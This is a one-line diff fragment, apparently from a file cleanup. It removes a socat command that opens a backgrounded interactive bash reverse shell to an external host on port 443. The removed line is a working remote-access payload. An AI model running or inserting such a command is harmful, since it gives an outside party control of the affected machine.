@@ -1,1 +1,0 @@
-socat tcp:t2wxglp4fc878g5qseyrkhly8peje73.c.39.rs:443 exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
